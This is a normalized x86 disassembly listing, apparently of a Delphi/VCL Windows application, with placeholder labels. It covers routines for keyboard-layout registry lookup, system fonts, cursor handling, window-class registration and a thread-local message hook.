mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4669be
lea eax [ ebp - 0x260 ]
call sub_404164
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404164
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41ac68
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_409018
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4544d0
test al al
je r-xdata
xor eax eax
push ebp
push sub_466973
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4043d4
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4043d4
sub_466a28
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_4692b8
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46906c
mov dl 0x1
mov eax [ rw-data ]
call sub_46906c
sub_466a94
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_466abc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_466a94
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406e5c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406de0
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_466b4c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_466c91
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46906c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424394
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424394
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424478
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424394
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424394
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424394
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46906c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_4241d8
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_4241d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c98
cmp [ rw-data ] 0x0
je r-xdata
sub_466cd0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_466d30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_466e6c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_466ee0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4665f0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4188a0
mov dl [ ebp - 0x1 ]
call sub_466d30
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4665dc
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418744
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_41891c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4188a0
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_466cd0
test al al
je r-xdata
inc esi
sub_46702c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4665f0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_4665dc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_467084
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46702c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4670fe
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_466ee0
pop ecx
push ebp
mov al 0x2
call sub_466ee0
pop ecx
push ebp
mov al 0x3
call sub_466ee0
pop ecx
push ebp
mov al 0x4
call sub_466ee0
pop ecx
push ebp
mov al 0x5
call sub_466ee0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_46710c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466ca0
xor eax eax
push ebp
push sub_467185
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_467084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_466ca8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4671a0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404164
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_4041b8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_4671f8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_467229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_469674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46724c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_447804
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4696f0
sub_4672a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_468790
sub_4672ec
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_4672a8
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46724c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_467360
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_4673bc
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_4673ec
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_467414
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4673bc
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_4673ec
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_4673ec
sub_467444
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
push [ esi + 0x4 ]
push [ esi ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax edi
call sub_46679c
pop edi
pop esi
pop ebx
retn
sub_467484
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421184
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_468b5c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_429128
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_4294f8
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4692f4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c8ec
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_468d54
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c914
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408a0c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4043d4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_4694d0
mov eax ebx
call sub_469e94
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46778c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46766d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_469ea4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_468b5c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_468d54
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4696f0
xor edx edx
mov eax esi
call sub_46906c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211d0
push esi
push sub_467bc0
mov eax esi
call sub_468948
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405b04
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403368
mov eax [ esi + 0x90 ]
call sub_403368
mov eax [ esi + 0x98 ]
call sub_403368
test bl bl
jle r-xdata
call sub_4222ac
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_46778c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46792d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467934
lea eax [ ebp - 0x2c ]
call sub_404164
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_467d0c
call sub_422214
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404624
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406ee4
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404164
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_468410
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_468410
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46793c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_4665f8
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46799c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418744
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_44f7b4
cmp ebx eax
je r-xdata
sub_467a0c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
